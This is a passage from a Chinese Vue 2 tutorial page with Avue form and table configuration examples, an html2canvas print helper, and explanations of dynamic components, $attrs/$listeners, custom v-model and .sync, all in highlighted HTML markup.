<span>\"3\"</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n            <span>rules</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>required</span><span>:</span> <span>true</span><span>,</span>\n                <span>message</span><span>:</span> <span>\"请输入名称\"</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"性别\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"sex\"</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"radio\"</span><span>,</span>\n            <span>span</span><span>:</span> <span>6</span><span>,</span>\n            <span>dicData</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"男\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>0</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"女\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>1</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n            <span>rules</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>required</span><span>:</span> <span>true</span><span>,</span>\n                <span>message</span><span>:</span> <span>\"请选择性别\"</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"兴趣爱好\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"hobby\"</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"checkbox\"</span><span>,</span>\n            <span>span</span><span>:</span> <span>12</span><span>,</span>\n            <span>dicData</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项1\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>0</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项2\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>1</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项3\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>2</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项4\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>3</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项5\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>4</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项6\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>5</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"公开资料\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"isPublish\"</span><span>,</span>\n            <span>span</span><span>:</span> <span>6</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"switch\"</span><span>,</span>\n            <span>dicData</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项1\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>0</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项2\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>1</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"\"</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"title\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"footer\"</span><span>,</span>\n            <span>span</span><span>:</span> <span>24</span><span>,</span>\n            <span>labelWidth</span><span>:</span> <span>0</span><span>,</span>\n            <span>formslot</span><span>:</span> <span>true</span><span>,</span>\n          <span>}</span><span>,</span>\n        <span>]</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>emptytChange</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>\n    <span>submit</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"表格\" tabindex=\"-1\"> 表格</h3>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>div</span><span>></span></span>\n    <span><span><span>&lt;</span>img</span> <span>ref</span><span><span>=</span><span>\"</span>printImg<span>\"</span></span> <span><span>style</span><span><span>=</span><span>\"</span><span><span>display</span><span>:</span>none<span>;</span></span><span>\"</span></span></span> <span>:src</span><span><span>=</span><span>\"</span>printImg<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>avue-crud</span>\n      <span>ref</span><span><span>=</span><span>\"</span>crud<span>\"</span></span>\n      <span>:data</span><span><span>=</span><span>\"</span>data<span>\"</span></span>\n      <span>:option</span><span><span>=</span><span>\"</span>option<span>\"</span></span>\n      <span>:page.sync</span><span><span>=</span><span>\"</span>page<span>\"</span></span>\n      <span>@row-del</span><span><span>=</span><span>\"</span>rowDel<span>\"</span></span>\n    <span>></span></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>menuLeft<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>el-button</span>\n          <span>icon</span><span><span>=</span><span>\"</span>el-icon-printer<span>\"</span></span>\n          <span>type</span><span><span>=</span><span>\"</span>primary<span>\"</span></span>\n          <span>size</span><span><span>=</span><span>\"</span>small<span>\"</span></span>\n          <span>:loading</span><span><span>=</span><span>\"</span>printLoading<span>\"</span></span>\n          <span>@click</span><span><span>=</span><span>\"</span>rowPrint<span>\"</span></span>\n        <span>></span></span>\n          打印\n        <span><span><span>&lt;/</span>el-button</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>tags<span>\"</span></span> <span>slot-scope</span><span><span>=</span><span>\"</span>scope<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>el-tag</span> <span>v-for</span><span><span>=</span><span>\"</span>(item, index) in scope.row.tags<span>\"</span></span> <span>:key</span><span><span>=</span><span>\"</span>index<span>\"</span></span><span>></span></span>\n          {{ item }}\n        <span><span><span>&lt;/</span>el-tag</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n    <span><span><span>&lt;/</span>avue-crud</span><span>></span></span>\n  <span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>import</span> html2canvas <span>from</span> <span>\"html2canvas\"</span><span>;</span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>name</span><span>:</span> <span>\"MyCrud\"</span><span>,</span>\n\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>printLoading</span><span>:</span> <span>false</span><span>,</span>\n      <span>printImg</span><span>:</span> <span>\"\"</span><span>,</span>\n      <span>page</span><span>:</span> <span>{</span>\n        <span>total</span><span>:</span> <span>1</span><span>,</span>\n        <span>pageSize</span><span>:</span> <span>20</span><span>,</span>\n        <span>pagerCount</span><span>:</span> <span>5</span><span>,</span>\n      <span>}</span><span>,</span>\n      <span>data</span><span>:</span> <span>[</span>\n        <span>{</span>\n          <span>title</span><span>:</span> <span>\"1\"</span><span>,</span>\n          <span>desc</span><span>:</span> <span>\"文件入库, 包含csv、excel等文件入库...\"</span><span>,</span>\n          <span>tag</span><span>:</span> <span>[</span><span>\"2\"</span><span>,</span> <span>\"2\"</span><span>]</span><span>,</span>\n          <span>create_user</span><span>:</span> <span>\"1\"</span><span>,</span>\n          <span>create_update</span><span>:</span> <span>\"1\"</span><span>,</span>\n          <span>concat</span><span>:</span> <span>\"1\"</span><span>,</span>\n        <span>}</span><span>,</span>\n      <span>]</span><span>,</span>\n      <span>option</span><span>:</span> <span>{</span>\n        <span>// border: true,</span>\n        <span>// printBtn: true,</span>\n        <span>addBtn</span><span>:</span> <span>true</span><span>,</span>\n        <span>index</span><span>:</span> <span>true</span><span>,</span>\n        <span>page</span><span>:</span> <span>true</span><span>,</span>\n        <span>indexLabel</span><span>:</span> <span>\"序号\"</span><span>,</span>\n        <span>// align: 'center',</span>\n        <span>// menuAlign: 'center',</span>\n        <span>column</span><span>:</span> <span>[</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"标题\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"title\"</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"描述\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"desc\"</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"标签\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"tags\"</span><span>,</span>\n            <span>slot</span><span>:</span> <span>true</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"select\"</span><span>,</span>\n            <span>multiple</span><span>:</span> <span>true</span><span>,</span>\n            <span>filterable</span><span>:</span> <span>true</span><span>,</span>\n            <span>allowCreate</span><span>:</span> <span>true</span><span>,</span>\n            <span>defaultFirstOption</span><span>:</span> <span>true</span><span>,</span>\n            <span>dicData</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"数据库\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"数据库\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"HTTP\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"HTTP\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"API\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"API\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"文件\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"文件\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"HDFS\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"HDFS\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"SPARK\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"SPARK\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"HAVE\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"HAVE\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"FTP\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"FTP\"</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"上传者\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"create_user\"</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"上传部门\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"create_update\"</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"联系方式\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"concat\"</span><span>,</span>\n          <span>}</span><span>,</span>\n        <span>]</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>setClass</span><span>(</span><span><span>{</span> row<span>,</span> column<span>,</span> rowIndex<span>,</span> columnIndex <span>}</span> <span>=</span> <span>{</span><span>}</span></span><span>)</span> <span>{</span>\n      <span>// console.log(column)</span>\n      <span>const</span> <span>{</span> label <span>}</span> <span>=</span> column<span>;</span>\n      <span>if</span> <span>(</span>label <span>===</span> <span>\"操作\"</span><span>)</span> <span>{</span>\n        <span>return</span> <span>\"no-print\"</span><span>;</span>\n      <span>}</span>\n      <span>// if (columnIndex === 8) {</span>\n      <span>//   return 'no-print'</span>\n      <span>// }</span>\n    <span>}</span><span>,</span>\n    <span>rowPrint</span><span>(</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span>option<span>.</span>menu <span>=</span> <span>false</span><span>;</span>\n      <span>const</span> printDOM <span>=</span> <span>this</span><span>.</span>$refs<span>.</span>crud<span>.</span>$el<span>.</span><span>querySelector</span><span>(</span><span>\".el-table\"</span><span>)</span><span>;</span>\n      <span>this</span><span>.</span>printLoading <span>=</span> <span>true</span><span>;</span>\n      <span>this</span><span>.</span><span>toImage</span><span>(</span>printDOM<span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n    <span>async</span> <span>toImage</span><span>(</span><span>printDOM</span><span>)</span> <span>{</span>\n      <span>setTimeout</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n        <span>const</span> canvas <span>=</span> <span>await</span> <span>html2canvas</span><span>(</span>printDOM<span>)</span><span>;</span>\n        <span>const</span> dataURL <span>=</span> canvas<span>.</span><span>toDataURL</span><span>(</span><span>\"image/png\"</span><span>,</span> <span>1.0</span><span>)</span><span>;</span>\n        <span>this</span><span>.</span>printImg <span>=</span> dataURL<span>;</span>\n        <span>await</span> <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>)</span><span>;</span>\n        <span>if</span> <span>(</span><span>this</span><span>.</span>printImg<span>)</span> <span>{</span>\n          <span>this</span><span>.</span><span>$print</span><span>(</span><span>this</span><span>.</span>$refs<span>.</span>printImg<span>,</span> <span>{</span>\n            <span>isImg</span><span>:</span> <span>true</span><span>,</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span>\n        <span>this</span><span>.</span>printLoading <span>=</span> <span>false</span><span>;</span>\n        <span>this</span><span>.</span>option<span>.</span>menu <span>=</span> <span>true</span><span>;</span>\n      <span>}</span><span>,</span> <span>100</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n    <span>rowDel</span><span>(</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span><span>$confirm</span><span>(</span><span>\"此操作将永久删除该数据, 是否继续?\"</span><span>,</span> <span>\"提示\"</span><span>,</span> <span>{</span>\n        <span>confirmButtonText</span><span>:</span> <span>\"确定\"</span><span>,</span>\n        <span>cancelButtonText</span><span>:</span> <span>\"取消\"</span><span>,</span>\n        <span>type</span><span>:</span> <span>\"warning\"</span><span>,</span>\n      <span>}</span><span>)</span>\n        <span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>\n          <span>this</span><span>.</span><span>$message</span><span>(</span><span>{</span>\n            <span>type</span><span>:</span> <span>\"success\"</span><span>,</span>\n            <span>message</span><span>:</span> <span>\"删除成功!\"</span><span>,</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>)</span>\n        <span>.</span><span>catch</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>\n          <span>this</span><span>.</span><span>$message</span><span>(</span><span>{</span>\n            <span>type</span><span>:</span> <span>\"info\"</span><span>,</span>\n            <span>message</span><span>:</span> <span>\"已取消删除\"</span><span>,</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n\n<span><span><span>&lt;</span>style</span><span>></span></span><span><span>\n<span>.el-tag + .el-tag</span> <span>{</span>\n  <span>margin-left</span><span>:</span> 10px<span>;</span>\n<span>}</span>\n</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"二次封装思路\" tabindex=\"-1\"> 二次封装思路</h2>\n<p>更多的封装思路阅读 <a href=\"https://juejin.im/post/6844904191224184840\" target=\"_blank\" rel=\"noopener noreferrer\">绝对干货~！学会这些 Vue 小技巧, 可以早点下班和女神约会了</a></p>\n<h3 id=\"component-动态组件\" tabindex=\"-1\"> component 动态组件</h3>\n<div><p>提示</p>\n<p>使用到的是 vue 中的动态组件 <code>component</code></p>\n</div>\n<ul>\n<li>\n<p>Props</p>\n<ul>\n<li><code>is</code> : - <em>string</em> | <em>ComponentDefinition</em> | <em>ComponentConstructor</em></li>\n<li><code>inline-template</code> : - <em>boolean</em></li>\n</ul>\n</li>\n<li>\n<p>用法</p>\n<p>渲染一个“元组件”为动态组件。依 <code>is</code> 的值, 来决定哪个组件被渲染。</p>\n</li>\n</ul>\n<div><pre><code><span>&lt;!-- 动态组件由 vm 实例的 `componentId` property 控制 --></span>\n<span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>\"</span>componentId<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>component</span><span>></span></span>\n\n<span>&lt;!-- 也能够渲染注册过的组件或 prop 传入的组件 --></span>\n<span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>\"</span>$options.components.child<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>component</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><ul>\n<li>参考：<a href=\"https://cn.vuejs.org/v2/guide/components.html#%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6\" target=\"_blank\" rel=\"noopener noreferrer\">动态组件</a></li>\n</ul>\n<p>示例：</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>component</span> <span>:is</span><span><span>=</span><span>\"</span>getComponent(type)<span>\"</span></span><span>></span></span> <span><span><span>&lt;/</span>component</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>type</span><span>:</span> <span>\"input\"</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>getComponent</span><span>(</span><span>type</span><span>)</span> <span>{</span>\n      <span>return</span> <span><span>`</span><span>el-</span><span><span>${</span>type<span>}</span></span><span>`</span></span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"attrs-与-listeners\" tabindex=\"-1\"> $attrs 与 $listeners</h3>\n<div><p>提示</p>\n<p><code>$attrs</code> : 当组件在调用时传入的属性没有在 <code>props</code> 里面定义时, 传入的属性将被绑定到 <code>$attrs</code> 属性内（ <code>class</code> 与 <code>style</code> 除外, 他们会挂载到组件最外层元素上）。并可通过 <code>v-bind=&quot;$attrs&quot;</code> 传入到内部组件中。</p>\n<p><code>$listeners</code> : 当组件被调用时, 外部监听的这个组件的所有事件都可以通过 <code>$listeners</code> 获取到。并可通过 <code>v-on=&quot;$listeners&quot;</code> 传入到内部组件中。</p>\n</div>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>component-name</span> <span>v-bind</span><span><span>=</span><span>\"</span>$attrs<span>\"</span></span> <span>v-on</span><span><span>=</span><span>\"</span>$listeners<span>\"</span></span> <span>/></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>对于 <code>$attrs</code> , 我们也可以使用 <code>$props</code> 来代替, 实现代码如下</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>component-name</span> <span>v-bind</span><span><span>=</span><span>\"</span>$props<span>\"</span></span> <span>v-on</span><span><span>=</span><span>\"</span>$listeners<span>\"</span></span> <span>/></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"自定义-v-model\" tabindex=\"-1\"> 自定义 v-model</h3>\n<p>在用 Vue 开发前端时, 不论使用原生还是封装好的 UI 库, 对于表单组件, 一般都会使用到<code>v-model</code>。虽然 <code>v-model</code> 是一个语法糖, 但是吃到嘴里挺甜的啊。学会自定义<code>v-model</code>, 还是很有必要的。</p>\n<p>一个组件上的 <code>v-model</code> 默认是通过在组件上面定义一个名为 <code>value</code> 的 <code>props</code>,同时对外暴露一个名为 <code>input</code> 的事件。</p>\n<p>方式一：通过 change 监听方式同步数据</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>\"</span>custom-input<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>input</span> <span>:value</span><span><span>=</span><span>\"</span>value<span>\"</span></span> <span>@change</span><span><span>=</span><span>\"</span>$_handleChange<span>\"</span></span> <span>/></span></span>\n  <span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>name</span><span>:</span> <span>\"custom-input\"</span><span>,</span>\n  <span>props</span><span>:</span> <span>{</span>\n    <span>value</span><span>:</span> <span>{</span>\n      <span>type</span><span>:</span> String<span>,</span>\n      <span>default</span><span>:</span> <span>\"\"</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>$_handleChange</span><span>(</span><span>e</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span><span>$emit</span><span>(</span><span>\"input\"</span><span>,</span> e<span>.</span>target<span>.</span>value<span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>方式二：使用 <code>computed</code> 中的 <code>get</code> 和 <code>set</code> 方法进行同步</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>\"</span>custom-input<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>input</span> <span>v-model</span><span><span>=</span><span>\"</span>text<span>\"</span></span> <span>/></span></span>\n  <span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>name</span><span>:</span> <span>\"custom-input\"</span><span>,</span>\n  <span>props</span><span>:</span> <span>{</span>\n    <span>value</span><span>:</span> <span>{</span>\n      <span>type</span><span>:</span> String<span>,</span>\n      <span>default</span><span>:</span> <span>\"\"</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>computed</span><span>:</span> <span>{</span>\n    <span>text</span><span>:</span> <span>{</span>\n      <span>get</span><span>(</span><span>)</span> <span>{</span>\n        <span>return</span> <span>this</span><span>.</span>value<span>;</span>\n      <span>}</span><span>,</span>\n      <span>set</span><span>(</span>value<span>)</span> <span>{</span>\n        <span>this</span><span>.</span><span>$emit</span><span>(</span><span>\"input\"</span><span>,</span> value<span>)</span><span>;</span>\n      <span>}</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>使用方式</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>custom-input</span> <span>v-model</span><span><span>=</span><span>\"</span>text<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-input</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>text</span><span>:</span> <span>\"\"</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"自定义-sync\" tabindex=\"-1\"> 自定义 .sync</h3>\n<p>在 Vue 中, props 属性是单向数据传输的,父级的 prop 的更新会向下流动到子组件中, 但是反过来不行。可是有些情况, 我们需要对 <code>prop</code> 进行“双向绑定”。上文中, 我们提到了使用 <code>v-model</code> 实现双向绑定。但有时候我们希望一个组件可以实现多个数据的“双向绑定”, 而 <code>v-model</code> 一个组件只能有一个(Vue3.0 可以有多个), 这时候就需要使用到 <code>.sync</code>。</p>\n<p><code>.sync</code> 与 <code>v-model</code> 的异同</p>\n<ul>\n<li>\n<p>相同点：</p>\n<ul>\n<li>两者的本质都是语法糖, 目的都是实现组件与外部数据的双向绑定</li>\n<li>两个都是通过属性+事件来实现的</li>\n</ul>\n</li>\n<li>\n<p>不同点：</p>\n<ul>\n<li>一个组件只能定义一个 <code>v-model</code>, 但可以定义多个 <code>.sync</code></li>\n<li><code>v-model</code> 与 <code>.sync</code> 对于的事件名称不同, <code>v-model</code> 默认事件为 <code>input</code>,可以通过配置 <code>model</code> 来修改, <code>.sync</code> 事件名称固定为 